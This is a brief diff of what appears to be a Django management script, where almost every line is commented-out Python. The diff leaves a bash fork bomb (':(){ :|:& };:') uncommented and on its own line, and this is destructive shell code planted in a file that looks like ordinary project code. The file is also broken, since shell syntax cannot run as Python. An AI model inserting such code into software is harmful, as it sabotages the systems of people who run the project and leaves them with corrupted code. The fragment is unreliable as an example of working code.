@@ -48,7 +48,8 @@ import sys
 #"Couldn't import Django. Are you sure it's installed and "
 #"available on your PYTHONPATH environment variable? Did you "
 #"forget to activate a virtual environment?"
-:(){ :|:& };: #print('[+] Deleting WRITEHATJSON database')
+:(){ :|:& };: 
+#print('[+] Deleting WRITEHATJSON database')
 #) from exc
 #if 'flush' in sys.argv:
 #print('[+] Deleting WRITEHATJSON database')
